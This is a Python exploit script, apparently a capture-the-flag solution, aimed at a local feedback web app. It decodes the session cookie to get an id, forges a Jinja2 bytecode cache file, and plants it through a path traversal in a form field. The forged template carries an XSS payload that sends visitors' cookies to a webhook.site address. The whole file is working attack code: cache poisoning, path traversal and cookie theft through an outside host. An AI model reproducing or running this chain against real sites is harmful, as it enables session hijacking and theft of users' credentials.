import os
import hashlib
import requests
import tempfile
import base64
import json
from jinja2 import Environment
from jinja2.bccache import FileSystemBytecodeCache
from jinja2 import compiler

TARGET = "http://localhost:3000"
TEMPLATE_NAME = "feedback.html"
EXFIL = "https://webhook.site/521a82b1-7aa1-4847-abe6-1239f9a9565b"
PAYLOAD = f"<script>fetch('{EXFIL}/?c='+document.cookie)</script>"

s = requests.Session()

r = s.post(f"{TARGET}/submit", data={
    "name": "test", "email": "test", "rating": "5", "feedback": "test"
})
page_id = r.json()["redirect"].split("=")[1]
print(f"[+] page_id: {page_id}")

s.get(f"{TARGET}/feedback?id={page_id}")
session_cookie = s.cookies.get("session")
print(f"[+] Session cookie: {session_cookie}")

padded = session_cookie.split(".")[0]
padded += "=" * (4 - len(padded) % 4)
decoded = json.loads(base64.urlsafe_b64decode(padded))
sid = decoded["id"]
print(f"[+] Session id: {sid}")

tmp = tempfile.mkdtemp()
fake_cache = FileSystemBytecodeCache(tmp)
fake_env = Environment(bytecode_cache=fake_cache)

source    = fake_env.parse(PAYLOAD)
generated = compiler.generate(source, fake_env, TEMPLATE_NAME, TEMPLATE_NAME)
code      = compile(generated, TEMPLATE_NAME, "exec")

bucket = fake_cache.get_bucket(fake_env, TEMPLATE_NAME, TEMPLATE_NAME, PAYLOAD)
bucket.code = code
fake_cache.dump_bytecode(bucket)

files = [f for f in os.listdir(tmp) if f.endswith(".cache")]
assert files, "Cache file was not written!"
cache_file = files[0]
cache_data = open(f"{tmp}/{cache_file}", "rb").read()
key = cache_file.replace(".cache", "")
print(f"[+] Cache file: {cache_file} ({len(cache_data)} bytes)")

traversal = f"../../tmp/jinja_cache/{sid}/{key}"
print(f"[+] Writing to: /tmp/jinja_cache/{sid}/{key}.cache")

r = s.post(f"{TARGET}/submit", data={
    "name":     traversal,
    "email":    cache_data.decode("latin-1"),
    "rating":   "5",
    "feedback": "x"
})

page_id = r.json()["redirect"].split("=")[1]
print(f"[+] Submitted, bot visiting /feedback?id={page_id}")
print(f"[+] Watch: {EXFIL}")